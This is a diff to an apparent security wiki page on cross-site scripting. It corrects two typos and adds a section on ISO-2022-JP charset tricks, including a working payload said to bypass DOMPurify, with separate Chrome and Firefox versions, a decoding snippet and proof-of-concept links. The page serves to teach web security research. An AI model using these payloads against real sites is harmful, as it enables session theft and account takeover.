@@ -30,7 +30,7 @@ The intention might be that we can write some styled code like `<b>hello</b>` to
 http://example.com/page?html=<script>alert(document.cookie)</script>
 ```
 
-This will place the `document.cookie` value (all your Cookies, like session tokens) in a simple `alert()` box that pops up on your screen. This is a common proof-of-concept to show an attacker is able to access and possibly exfiltrate a user's cookies in order to impersonate them.&#x20;
+This will place the `document.cookie` value (all your Cookies, like session tokens) in a simple `alert()` box that pops up on your screen. This is a common proof-of-concept to show an attacker is able to access and possibly exfiltrate a user's cookies in order to impersonate them.
 
 ## Contexts
 
@@ -282,7 +282,7 @@ This can cause an interesting exploit as shown in the example below ([source](ht
 <strong>&#x3C;input type="text" value="&#x3C;/script>&#x3C;script>alert()&#x3C;/script>">
 </strong></code></pre>
 
-Notice that the closing script tag on line 3 doesn't close it anymore, but instead, only after the closing it a second time inside of the attribute. We are then in an HTML context and can write any XSS payload without double-quotes!
+Notice that the closing script tag on line 3 doesn't close it anymore, but instead, only after closing it a second time inside of the attribute. We are then in an HTML context and can write any XSS payload without double-quotes!
 
 {% hint style="info" %}
 For more advanced tricks and pitfalls, check out the [javascript](../../../languages/javascript/ "mention") page.
@@ -541,6 +541,13 @@ For the first attack, we can make `\` characters useless after having written `\
 
 <figure><img src="../../../.gitbook/assets/image (53).png" alt="" width="563"><figcaption><p>2. Bypass using <em>JIS X 0201 1976</em> escape sequence in search, ignoring backslashes and escaping with quote</p></figcaption></figure>
 
+```html
+You searched for: (J
+<script>
+  var language = "en\";alert(1)//";
+</script>
+```
+
 #### 2. Breaking HTML Context
 
 The _JIS X 0201 1978_ and _JIS X 0201 1983_ charsets are useful for a different kind of attack. They turn sequences of 2 bytes into 1 character, effectively obfuscating any characters that would normally come after it. This continues until another escape sequence to reset the encoding is encountered like switching to _ASCII_.
@@ -587,6 +594,38 @@ window.open(URL.createObjectURL(blob));  // opened in another top-level context
 ```
 
 Not in all context will the charset be heuristically detected. The _top-most same-origin frame_ will decide, so if the above blob URL was iframed, for example, the exploit wouldn't work. This is because the parent frame's charset will be inherited by the iframe, it won't be detected again.
+
+#### Browser charset detection
+
+The detection mechanism also differs per browser. In Chrome, you just need to convince the detection by having enough escape sequences, [as noticed experimentally](https://x.com/J0R1AN/status/1871586792455163975). Firefox is more logical in that the decoded string needs to all be valid mapped characters. Most are, but some byte combinations in ASCII turn into invalid unicode in the 2-wide charset variations. That means you must be careful with which characters you choose, but sometimes shifting the length by 1 can push them into the mapped territory again by chance.
+
+For example, the following vector which would bypass DOMPurify without any attributes:
+
+{% code title="Chrome only" %}
+```html
+\x1b$B<style>\x1b(B<\x1b(Bimg src=x onerror=alert(origin)></style>
+```
+{% endcode %}
+
+While [it works on Chrome](https://r.jtw.sh/poc.html?body=%1B%24B%3Cstyle%3E%1B%28B%3C%1B%28Bimg+src%3Dx+onerror%3Dalert%28origin%29%3E%3C%2Fstyle%3E), it does _not_ on Firefox. The reason for this, is that if we decode it, `�` characters appear. We need to alter the payload in such a way that everything in the output has a valid codepoint instead of this replacement character.
+
+```javascript
+d = new TextDecoder("ISO-2022-JP");
+e = new TextEncoder("UTF-8");
+s = `\x1b$B<style>\x1b(B<\x1b(Bimg src=x onerror=alert(origin)></style>`;
+console.log(d.decode(e.encode(s)));
+// '首�跂�<img src=x onerror=alert(origin)></style>'
+```
+
+The 2-wide charset region starts from `\x1b$B` and ends at `\x1b(B`. The bytes are divided as `<s` `ty` `le` `>`, of which both `ty` and `>` don't map to valid characters in _JIS X 0201 1978_. But, we can simply put an `a` in front it to create chunks like `a<` `st` `yl` `e>`, which all happen to be valid characters! A [working payload for Firefox](https://r.jtw.sh/poc.html?body=%1B%24Ba%3Cstyle%3E%1B%28B%3C%1B%28Bimg+src%3Dx+onerror%3Dalert%28origin%29%3E%3C%2Fstyle%3E) would thus be:
+
+{% code title="Working on Firefox" %}
+```html
+\x1b$Ba<style>\x1b(B<\x1b(Bimg src=x onerror=alert(origin)></style>
+```
+{% endcode %}
+
+For a searchable list of all characters that do and don't work, see [this gist](https://gist.github.com/JorianWoltjer/7faca2472e8835ba6b493f1a00880bd6).
 
 ## Exploitation
 
